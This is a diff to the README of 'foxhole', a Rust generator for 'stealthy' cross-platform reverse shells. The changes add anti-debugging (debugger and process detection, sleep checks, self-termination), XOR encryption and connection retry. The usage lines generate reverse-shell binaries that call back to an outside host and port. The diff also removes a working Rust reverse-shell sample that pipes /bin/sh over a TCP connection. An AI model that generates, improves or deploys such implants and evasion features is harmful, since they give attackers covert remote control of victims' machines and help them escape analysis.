@@ -6,6 +6,9 @@ A stealthy, cross-platform reverse shell generator written in Rust.
 
 - Cross-platform support (Linux and Windows)
 - TLS encryption support
+- XOR encryption for sensitive data
+- Anti-debugging capabilities
+- Connection retry with exponential backoff
 - Customizable shell path
 - Minimal and fast binaries
 - Release mode compilation for smaller size
@@ -21,7 +24,7 @@ cargo build --release
 ## Usage
 
 ```bash
-foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <shell_path>] [--tls] --output <output_path>
+foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <shell_path>] [--tls] [--anti-debug] --output <output_path>
 ```
 
 ### Command Line Arguments
@@ -31,6 +34,7 @@ foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <she
 - `--os`: Target operating system (linux or windows)
 - `--shell`: Custom shell path (optional)
 - `--tls`: Enable TLS encryption
+- `--anti-debug`: Enable anti-debugging features
 - `--output`: Output binary path
 
 ### Examples
@@ -40,50 +44,31 @@ Basic Linux reverse shell:
 foxhole --ip 192.168.1.100 --port 4444 --os linux --output shell
 ```
 
-Windows reverse shell with TLS:
+Windows reverse shell with TLS and anti-debugging:
 ```bash
-foxhole --ip example.com --port 443 --os windows --tls --output shell.exe
+foxhole --ip example.com --port 443 --os windows --tls --anti-debug --output shell.exe
 ```
 
-Custom shell path:
+Custom shell path with all features:
 ```bash
-foxhole --ip 192.168.1.100 --port 4444 --os linux --shell /bin/bash --output shell
+foxhole --ip 192.168.1.100 --port 4444 --os linux --shell /bin/bash --tls --anti-debug --output shell
 ```
 
-### Generated Shell Code Example
+### Anti-Debugging Features
 
-```rust
-use std::io::{self, Read, Write};
-use std::net::TcpStream;
-use std::process::{Command, Stdio};
+When enabled, the generated binary includes:
+- Debugger detection for Windows and Linux
+- Process monitoring for common debuggers (GDB, LLDB, IDA, etc.)
+- Sleep detection to detect time manipulation
+- Automatic termination if debugging is detected
 
-fn main() -> io::Result<()> {
-    let addr = "192.168.1.100:4444";
-    let stream = TcpStream::connect(addr)?;
-    let mut stream = stream;
+### Connection Features
 
-    let mut child = Command::new("/bin/sh")
-        .stdin(Stdio::piped())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .spawn()?;
-
-    let mut buffer = [0; 1024];
-    loop {
-        let n = stream.read(&mut buffer)?;
-        if n == 0 { break; }
-        
-        child.stdin.as_mut().unwrap().write_all(&buffer[..n])?;
-        child.stdin.as_mut().unwrap().flush()?;
-        
-        let mut output = String::new();
-        child.stdout.as_mut().unwrap().read_to_string(&mut output)?;
-        stream.write_all(output.as_bytes())?;
-        stream.flush()?;
-    }
-    Ok(())
-}
-```
+The generated binary includes:
+- Automatic connection retry with exponential backoff
+- Configurable retry parameters
+- TLS support with proper error handling
+- XOR encryption for sensitive data
 
 ## Requirements
 
